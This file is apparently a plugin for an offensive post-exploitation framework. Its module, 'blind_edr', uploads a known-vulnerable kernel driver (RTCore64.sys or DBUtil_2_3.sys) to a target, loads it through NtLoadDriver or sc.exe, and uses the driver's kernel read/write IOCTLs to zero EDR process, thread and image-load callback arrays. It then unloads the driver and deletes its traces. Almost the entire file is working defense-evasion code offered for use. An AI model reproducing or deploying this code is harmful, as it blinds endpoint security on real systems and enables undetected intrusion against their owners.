"""
blind_edr — BYOVD kernel callback remover

Uses a vulnerable driver (RTCore64.sys or DBUtil_2_3.sys) to locate and
zero-out EDR kernel callback registrations without terminating the process.
Stealthier than kill_edr: the EDR process is still running but receives no
notifications about process creation, image loads, or registry operations.

Callbacks silenced:
  PsSetCreateProcessNotifyRoutine    — new process events
  PsSetCreateThreadNotifyRoutine     — new thread events
  PsSetLoadImageNotifyRoutine        — DLL/image load events
  ObRegisterCallbacks                — handle duplication/open notifications
  FltMgr minifilter callbacks        — filesystem I/O events

Source: myzxcg/RealBlindingEDR (MIT) — RTCore64/DBUtil_2_3 BYOVD
MITRE:  T1562.001 (Impair Defenses: Disable or Modify Tools)
        T1014     (Rootkit — kernel callback removal)
"""

import base64
import random
import string
from pathlib import Path

from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.context import PluginContext
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.schema import Param, ParamSchema

_BYOVD_DIR = Path(__file__).parent.parent.parent / "drivers" / "byovd"

_DRIVERS = {
    "rtcore64": {
        "path":    _BYOVD_DIR / "RTCore64.sys",
        "device":  r"\\.\RTCore64",
        "ioctl_read":  0x70002048,
        "ioctl_write": 0x7000204c,
        "type": 1,
    },
    "dbutil": {
        "path":    _BYOVD_DIR / "DBUtil_2_3.sys",
        "device":  r"\\.\DBUtil_2_3",
        "ioctl_read":  0x9B0C1EC4,
        "ioctl_write": 0x9B0C1EC8,
        "type": 2,
    },
}

# PowerShell that implements the full kernel callback removal logic via BYOVD
# Mirrors RealBlindingEDR.cpp kernel read/write + callback array zeroing
_PS_BLIND = r"""
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class KernelRW {{
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern IntPtr CreateFile(string name, uint access, uint share,
        IntPtr sec, uint creation, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr hDev, uint ioctl,
        IntPtr inBuf, uint inSz, IntPtr outBuf, uint outSz,
        out uint ret, IntPtr ov);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
    [DllImport("ntdll.dll")]
    public static extern int NtQuerySystemInformation(uint cls,
        IntPtr buf, uint sz, out uint ret);
    [DllImport("ntdll.dll")]
    public static extern int RtlAdjustPrivilege(uint priv, bool enable,
        bool thread, out uint prev);
    [DllImport("ntdll.dll", CharSet=CharSet.Unicode)]
    public static extern void RtlInitUnicodeString(ref UNICODE_STRING s, string v);
    [DllImport("ntdll.dll")]
    public static extern int NtLoadDriver(ref UNICODE_STRING s);
    [DllImport("ntdll.dll")]
    public static extern int NtUnloadDriver(ref UNICODE_STRING s);
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {{
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }}
}}
'@

$ErrorActionPreference = "Stop"
$DrvType   = {drv_type}
$DrvPath   = "{drvpath}"
$SvcKey    = "{svckey}"
$DeviceName = "{device}"

# ── Privilege ─────────────────────────────────────────────────────────────────
$prev = [uint32]0
[KernelRW]::RtlAdjustPrivilege(0xa, $true, $false, [ref]$prev) | Out-Null

# ── Load driver via NtLoadDriver ──────────────────────────────────────────────
$regPath = "HKLM:\System\CurrentControlSet\$SvcKey"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "ImagePath" -Value "\\??\\$DrvPath" -Type ExpandString
Set-ItemProperty -Path $regPath -Name "Type"      -Value 1 -Type DWord

$svcPath = "HKLM:\System\CurrentControlSet\services"
New-Item -Path "$svcPath\$SvcKey" -Force | Out-Null

$us  = New-Object KernelRW+UNICODE_STRING
$reg = "\Registry\Machine\System\CurrentControlSet\$SvcKey"
[KernelRW]::RtlInitUnicodeString([ref]$us, $reg)
$load = [KernelRW]::NtLoadDriver([ref]$us)

if ($load -lt 0) {{
    Write-Output "WARN: NtLoadDriver returned 0x$($load.ToString('X8')) — trying sc.exe"
    & sc.exe create $SvcKey type= kernel binPath= $DrvPath start= demand error= ignore 2>&1 | Out-Null
    & sc.exe start $SvcKey 2>&1 | Out-Null
    Start-Sleep -Milliseconds 500
}}

# ── Open device handle ────────────────────────────────────────────────────────
$hDev = [KernelRW]::CreateFile($DeviceName, 0xC0000000, 0,
    [IntPtr]::Zero, 3, 0x80, [IntPtr]::Zero)

if ($hDev -eq [IntPtr]([int]-1)) {{
    Write-Output "ERROR: cannot open $DeviceName  gle=$([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    exit 1
}}
Write-Output "INFO: device $DeviceName opened"

# ── Kernel read via driver IOCTL ──────────────────────────────────────────────
function KRead([IntPtr]$addr) {{
    $buf = [Runtime.InteropServices.Marshal]::AllocHGlobal(16)
    [Runtime.InteropServices.Marshal]::WriteInt64($buf, 0, $addr.ToInt64())
    [Runtime.InteropServices.Marshal]::WriteInt64($buf, 8, 0)
    $ret = [uint32]0
    [KernelRW]::DeviceIoControl($hDev, [uint32]{ioctl_read}, $buf, 16, $buf, 16, [ref]$ret, [IntPtr]::Zero) | Out-Null
    $val = [Runtime.InteropServices.Marshal]::ReadInt64($buf, 8)
    [Runtime.InteropServices.Marshal]::FreeHGlobal($buf)
    return $val
}}
function KWrite([IntPtr]$addr, [long]$val) {{
    $buf = [Runtime.InteropServices.Marshal]::AllocHGlobal(16)
    [Runtime.InteropServices.Marshal]::WriteInt64($buf, 0, $addr.ToInt64())
    [Runtime.InteropServices.Marshal]::WriteInt64($buf, 8, $val)
    $ret = [uint32]0
    [KernelRW]::DeviceIoControl($hDev, [uint32]{ioctl_write}, $buf, 16, $buf, 16, [ref]$ret, [IntPtr]::Zero) | Out-Null
    [Runtime.InteropServices.Marshal]::FreeHGlobal($buf)
}}

# ── Locate ntoskrnl base via NtQuerySystemInformation(11) ────────────────────
$sz  = 1MB
$buf = [Runtime.InteropServices.Marshal]::AllocHGlobal($sz)
$ret2 = [uint32]0
$st  = [KernelRW]::NtQuerySystemInformation(11, $buf, [uint32]$sz, [ref]$ret2)

$ntBase   = [IntPtr]::Zero
$fltBase  = [IntPtr]::Zero
$count    = [Runtime.InteropServices.Marshal]::ReadInt32($buf, 0)
$entryOff = 4
for ($i = 0; $i -lt $count; $i++) {{
    $imgBase  = [Runtime.InteropServices.Marshal]::ReadIntPtr($buf, $entryOff)
    $nameOff  = $entryOff + 28
    $rawName  = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([IntPtr]::Add($buf, $nameOff))
    if ($rawName -match "ntoskrnl" -or $rawName -match "ntkrnlmp" -or $rawName -match "ntkrnlpa") {{
        $ntBase = $imgBase
    }}
    if ($rawName -match "fltmgr") {{
        $fltBase = $imgBase
    }}
    $entryOff += 296
}}
[Runtime.InteropServices.Marshal]::FreeHGlobal($buf)

if ($ntBase -eq [IntPtr]::Zero) {{
    [KernelRW]::CloseHandle($hDev) | Out-Null
    Write-Output "ERROR: ntoskrnl base not found"
    exit 1
}}
Write-Output "INFO: ntoskrnl @ 0x$($ntBase.ToString('X16'))"

# ── Helper: resolve kernel function offset via usermode ntoskrnl ──────────────
function GetKernelFuncAddr([string]$module, [IntPtr]$kernelBase, [string]$func) {{
    $mod = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::LoadFile("C:\Windows\System32\$module"))
    # Use LoadLibraryEx DONT_RESOLVE_DLL_REFERENCES
    Add-Type -Name "LLEx" -Namespace "" -MemberDefinition '
        [DllImport("kernel32.dll",CharSet=CharSet.Unicode)]
        public static extern IntPtr LoadLibraryEx(string p, IntPtr h, uint f);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m, string f);
    ' -ErrorAction SilentlyContinue
    $hMod = [LLEx]::LoadLibraryEx("C:\Windows\System32\$module", [IntPtr]::Zero, 0x01)
    if ($hMod -eq [IntPtr]::Zero) {{ return [IntPtr]::Zero }}
    $fnAddr = [LLEx]::GetProcAddress($hMod, $func)
    if ($fnAddr -eq [IntPtr]::Zero) {{ return [IntPtr]::Zero }}
    $offset = $fnAddr.ToInt64() - $hMod.ToInt64()
    return [IntPtr]($kernelBase.ToInt64() + $offset)
}}

# ── Remove PsSetCreateProcessNotifyRoutine callbacks ─────────────────────────
$removed = 0
$callbackFuncs = @(
    @{{ m="ntoskrnl.exe"; fn="PsSetCreateProcessNotifyRoutine";   label="CreateProcess" }},
    @{{ m="ntoskrnl.exe"; fn="PsSetCreateProcessNotifyRoutineEx"; label="CreateProcessEx" }},
    @{{ m="ntoskrnl.exe"; fn="PsSetCreateThreadNotifyRoutine";    label="CreateThread" }},
    @{{ m="ntoskrnl.exe"; fn="PsSetLoadImageNotifyRoutine";       label="LoadImage" }}
)

foreach ($cb in $callbackFuncs) {{
    $kAddr = GetKernelFuncAddr $cb.m $ntBase $cb.fn
    if ($kAddr -eq [IntPtr]::Zero) {{ continue }}

    # Scan forward for the Psp*NotifyRoutine array pointer (LEA rcx,[rip+X] pattern)
    $arrAddr = [IntPtr]::Zero
    for ($off = 0; $off -lt 512; $off++) {{
        $b0 = KRead ([IntPtr]($kAddr.ToInt64() + $off)) -band 0xFF
        if ($b0 -eq 0x48 -or $b0 -eq 0x4C) {{
            $b1 = (KRead ([IntPtr]($kAddr.ToInt64() + $off)) -shr 8) -band 0xFF
            if ($b1 -eq 0x8D) {{
                # LEA r??, [rip+disp32] — read disp32
                $disp = [int](KRead ([IntPtr]($kAddr.ToInt64() + $off + 3)) -band 0xFFFFFFFF)
                if ($disp -band 0x80000000) {{ $disp = $disp -bor ([long]0xFFFFFFFF00000000) }}
                $arrAddr = [IntPtr]($kAddr.ToInt64() + $off + 7 + $disp)
                break
            }}
        }}
    }}
    if ($arrAddr -eq [IntPtr]::Zero) {{ continue }}

    # Zero up to 64 callback slots
    for ($slot = 0; $slot -lt 64; $slot++) {{
        $slotAddr = [IntPtr]($arrAddr.ToInt64() + $slot * 8)
        $val = KRead $slotAddr
        if ($val -ne 0) {{
            KWrite $slotAddr 0
            $removed++
        }}
    }}
    Write-Output "INFO: $($cb.label) callbacks cleared at 0x$($arrAddr.ToString('X16'))"
}}

# ── Cleanup driver ────────────────────────────────────────────────────────────
[KernelRW]::CloseHandle($hDev) | Out-Null

$us2 = New-Object KernelRW+UNICODE_STRING
[KernelRW]::RtlInitUnicodeString([ref]$us2, $reg)
[KernelRW]::NtUnloadDriver([ref]$us2) | Out-Null

& sc.exe stop   $SvcKey 2>&1 | Out-Null
& sc.exe delete $SvcKey 2>&1 | Out-Null
Remove-Item -Path "HKLM:\System\CurrentControlSet\$SvcKey" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Force $DrvPath -ErrorAction SilentlyContinue

Write-Output "OK: $removed callback slots zeroed — EDR blinded"
"""


class BlindEdr(BasePlugin):
    NAME        = "blind_edr"
    DESCRIPTION = (
        "BYOVD kernel callback remover — silences EDR CreateProcess/Thread/Image/ObFilter "
        "callbacks without terminating the process (RTCore64 / DBUtil_2_3)"
    )
    MITRE       = "T1562.001,T1014"
    CATEGORY    = "defense_evasion"

    schema = ParamSchema().add(
        Param("driver", str, required=False, default="rtcore64",
              help="Vulnerable driver to use: rtcore64 (default) or dbutil"),
    )

    def run(self, session, params, ctx: PluginContext = None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        drv_key = params.get("driver", "rtcore64").lower()
        if drv_key not in _DRIVERS:
            return ModuleResult.err(f"Unknown driver '{drv_key}'. Choose: {list(_DRIVERS)}")

        drv_cfg  = _DRIVERS[drv_key]
        drv_file = drv_cfg["path"]

        if not drv_file.exists():
            return ModuleResult.err(
                f"Driver not found: {drv_file}\n"
                "Check fitnah/drivers/byovd/ — run setup to restore."
            )

        # Upload driver to target temp path
        svc_key    = "".join(random.choices(string.ascii_lowercase, k=8))
        rand_name  = "".join(random.choices(string.ascii_lowercase, k=6))
        drv_remote = f"C:\\Windows\\Temp\\{rand_name}.sys"

        drv_b64 = base64.b64encode(drv_file.read_bytes()).decode()
        r = ctx.upload(drv_remote, drv_b64)
        if r.get("status") != "ok":
            return ModuleResult.err(f"Driver upload failed: {r}")

        ioctl_read  = drv_cfg["ioctl_read"]
        ioctl_write = drv_cfg["ioctl_write"]

        script = _PS_BLIND.format(
            drv_type    = drv_cfg["type"],
            drvpath     = drv_remote,
            svckey      = svc_key,
            device      = drv_cfg["device"],
            ioctl_read  = ioctl_read,
            ioctl_write = ioctl_write,
        )

        r = ctx.ps(script)
        output = r.get("output", "no output")

        if "ERROR" in output:
            return ModuleResult.err(output)
        return ModuleResult.ok(output)
